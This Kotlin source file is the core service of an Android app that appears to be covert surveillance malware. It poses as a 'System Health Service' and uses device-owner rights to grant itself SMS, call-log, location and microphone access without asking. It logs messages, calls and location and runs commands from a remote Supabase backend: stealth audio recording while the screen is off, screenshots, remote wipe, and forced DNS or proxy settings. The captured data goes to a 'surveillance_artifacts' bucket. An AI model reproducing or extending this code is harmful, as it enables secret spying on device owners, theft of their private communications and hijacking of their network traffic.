package com.system.dpc

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.graphics.Bitmap
import android.location.Location
import android.net.ProxyInfo
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.gms.location.*
import io.github.jan.supabase.auth.auth
import io.github.jan.supabase.auth.providers.builtin.Email
import io.github.jan.supabase.postgrest.postgrest
import io.github.jan.supabase.realtime.PostgresAction
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.postgresChangeFlow
import io.github.jan.supabase.realtime.realtime
import io.github.jan.supabase.storage.storage
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.tasks.await
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

class MainService : Service() {

    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private lateinit var db: AppDatabase
    private lateinit var wakeLock: PowerManager.WakeLock

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    private var smsObserver: ContentObserver? = null
    private var callLogObserver: ContentObserver? = null
    private lateinit var locationCallback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdmin::class.java)
        db = AppDatabase.getDatabase(this)
        wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DPC::Wakelock")

        Supabase.initialize(this)
        createNotificationChannel()
        grantPermissions()
        registerObservers()
        startLocationUpdates()
        scheduleSyncWorker()
        if (!wakeLock.isHeld) wakeLock.acquire()
    }

    private fun grantPermissions() {
        if (dpm.isDeviceOwnerApp(packageName)) {
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.READ_SMS, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.READ_CALL_LOG, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.ACCESS_FINE_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.ACCESS_BACKGROUND_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.RECORD_AUDIO, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setLocationEnabled(adminComponent, true)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(1, notification)
        scope.launch { while (true) { performSupabaseHandshake(); delay(60000) } }
        scope.launch { subscribeToCommands() }
        return START_STICKY
    }

    private suspend fun performSupabaseHandshake() {
        try {
            val session = Supabase.client.auth.sessionStatus.first()
            if (session !is io.github.jan.supabase.auth.SessionStatus.Authenticated) {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val deviceEmail = "device_$deviceId@system.local"
                try {
                    Supabase.client.auth.signInWith(Email) { email = deviceEmail; password = "password" }
                } catch (e: Exception) {
                    try {
                        Supabase.client.auth.signUpWith(Email) { email = deviceEmail; password = "password" }
                    } catch (signUpException: Exception) {
                        // Handle sign up error if necessary
                    }
                }
            }
            upsertDeviceStatus()
        } catch (e: Exception) {
            delay(5000)
        }
    }

    private suspend fun upsertDeviceStatus() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val device = Device(deviceId, Build.MODEL, Build.VERSION.RELEASE, getBatteryLevel())
        Supabase.client.postgrest.from("devices").upsert(device)
    }

    private suspend fun subscribeToCommands() {
        try {
            val channel = Supabase.client.realtime.channel("commands")
            channel.postgresChangeFlow<PostgresAction.Insert>(schema = "public").collect {
                val command = it.recordAs<Command>()
                if (command.status == "pending") {
                    handleCommand(command)
                }
            }
            Supabase.client.realtime.connect()
            channel.subscribe()
        } catch (e: Exception) {
            delay(5000)
            subscribeToCommands()
        }
    }

    private suspend fun handleCommand(command: Command) {
        if (!dpm.isAdminActive(adminComponent)) return
        var status = "executed"
        var response: String? = null
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        try {
            when (command.action) {
                "LOCK" -> dpm.lockNow()
                "WIPE" -> dpm.wipeData(0)
                "LOCATE", "LOCATE_NOW" -> {
                    val loc = getLocation()
                    response = "${loc.latitude},${loc.longitude}"
                    if (command.action == "LOCATE_NOW") {
                        val history = LocationHistory(0, deviceId, loc.latitude, loc.longitude, loc.altitude, loc.speed, loc.bearing, System.currentTimeMillis(), false)
                        Supabase.client.postgrest.from("location_history").insert(history)
                    }
                }
                "RECORD_AUDIO_30S" -> {
                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                    if (pm.isInteractive) throw Exception("Screen Active")
                    val file = File(cacheDir, "rec_${System.currentTimeMillis()}.m4a")
                    
                    val helper = AudioCaptureHelper(this)
                    val deferred = CompletableDeferred<Unit>()
                    helper.startStealthRecording(file, object : AudioCaptureHelper.AudioCaptureCallback {
                        override fun onCaptureComplete(file: File) { deferred.complete(Unit) }
                        override fun onCaptureError(error: String) { deferred.completeExceptionally(Exception(error)) }
                    })
                    
                    deferred.await()
                    
                    val path = "$deviceId/audio/${file.name}"
                    Supabase.client.storage.from("surveillance_artifacts").upload(path, file.readBytes(), upsert = true)
                    file.delete()
                    response = path
                }
                "TAKE_SCREENSHOT" -> {
                    val service = DpcAccessibilityService.instance ?: throw Exception("Accessibility Service not available")
                    try {
                        val bitmap = service.captureScreenshot()
                        val stream = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                        val path = "$deviceId/screen/${System.currentTimeMillis()}.png"
                        Supabase.client.storage.from("surveillance_artifacts").upload(path, stream.toByteArray(), upsert = true)
                        Supabase.client.postgrest.from("commands").update({ "status" to "executed"; "response_payload" to path }) { filter { eq("id", command.id) } }
                    } catch (e: Exception) {
                        Supabase.client.postgrest.from("commands").update({ "status" to "failed"; "response_payload" to "Screenshot failed: ${e.message}" }) { filter { eq("id", command.id) } }
                    }
                    return 
                }
                "SET_DNS" -> {
                    val dns = command.payload
                    if(dns != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            dpm.setGlobalPrivateDnsModeSpecifiedHost(adminComponent, dns)
                            response = "DNS set to $dns"
                        } else {
                            throw Exception("Private DNS not supported on this version")
                        }
                    } else {
                        throw Exception("DNS host not provided")
                    }
                }
                "SET_PROXY" -> {
                    val proxy = command.payload
                    if (proxy != null && proxy.contains(":")) {
                        val parts = proxy.split(":")
                        val host = parts[0]
                        val port = parts[1].toIntOrNull()
                        if (port != null) {
                            val proxyInfo = ProxyInfo.buildDirectProxy(host, port)
                            dpm.setRecommendedGlobalProxy(adminComponent, proxyInfo)
                            response = "Proxy set to $host:$port"
                        } else {
                            throw Exception("Invalid proxy port")
                        }
                    } else {
                        throw Exception("Invalid proxy format. Expected host:port")
                    }
                }
            }
        } catch (e: Exception) {
            status = "failed"
            response = e.message ?: "Unknown error"
        }

        if (command.action != "TAKE_SCREENSHOT") { 
            Supabase.client.postgrest.from("commands").update({ "status" to status; "response_payload" to response }) { filter { eq("id", command.id) } }
        }
    }

    private suspend fun getLocation(): Location {
        val client = LocationServices.getFusedLocationProviderClient(this)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            throw SecurityException("Location permission not granted")
        }
        return client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null).await()
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return intent?.let { (it.getIntExtra("level", -1) * 100) / it.getIntExtra("scale", -1) } ?: 50
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "hc")
            .setContentTitle("System Health Service")
            .setContentText("Monitoring device status...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        val chan = NotificationChannel("hc", "System Health", NotificationManager.IMPORTANCE_LOW)
        chan.description = "Required for system monitoring"
        getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
    }

    private fun registerObservers() {
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                uri?.let { readSmsFromUri(it) }
            }
        }
        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)

        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                readCallLog()
            }
        }
        contentResolver.registerContentObserver(android.provider.CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
    }

    private fun readSmsFromUri(uri: Uri) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
        contentResolver.query(uri, null, null, null, null)?.use {
            if (it.moveToFirst()) {
                val num = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                scope.launch { db.localSmsDao().insert(LocalSms(0, num, body, System.currentTimeMillis(), false)) }
            }
        }
    }

    private fun readCallLog() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
        val projection = arrayOf(android.provider.CallLog.Calls.NUMBER, android.provider.CallLog.Calls.DURATION, android.provider.CallLog.Calls.DATE)
        contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, projection, null, null, "date DESC LIMIT 1")?.use {
            if (it.moveToFirst()) {
                val num = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
                val dur = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
                val date = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
                scope.launch { db.localCallDao().insert(LocalCall(0, num, dur, date, false)) }
            }
        }
    }

    private fun scheduleSyncWorker() {
        val req = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueue(req)
    }

    private fun startLocationUpdates() {
        val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 300000).setMinUpdateIntervalMillis(60000).build()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(res: LocationResult) {
                for (l in res.locations) {
                    scope.launch {
                        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                        db.locationHistoryDao().insert(LocationHistory(0, deviceId, l.latitude, l.longitude, l.altitude, l.speed, l.bearing, System.currentTimeMillis(), false))
                    }
                }
            }
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            LocationServices.getFusedLocationProviderClient(this).requestLocationUpdates(req, locationCallback, Looper.getMainLooper())
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
        scope.launch { Supabase.client.realtime.disconnect() }
        LocationServices.getFusedLocationProviderClient(this).removeLocationUpdates(locationCallback)
        if (wakeLock.isHeld) wakeLock.release()
    }
}
